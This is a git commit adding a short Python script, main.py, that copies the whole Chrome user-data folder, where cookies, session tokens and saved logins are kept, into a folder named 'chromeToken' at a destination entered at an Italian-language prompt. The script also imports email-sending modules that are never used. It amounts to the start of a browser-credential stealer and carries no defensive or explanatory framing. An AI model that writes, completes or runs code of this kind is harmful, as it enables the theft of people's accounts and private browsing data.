9af570a3904a617fd0476b1930ad93f5ab204144
CursedRicky <78096957+CursedRicky@users.noreply.github.com>
2024-01-17 16:44:40 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,8 @@
+import shutil, os, smtplib
+from email.message import EmailMessage
+
+src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"
+dst = input("Percorso destinazione: ")
+
+shutil.copytree(src, dst + r"\chromeToken")
+
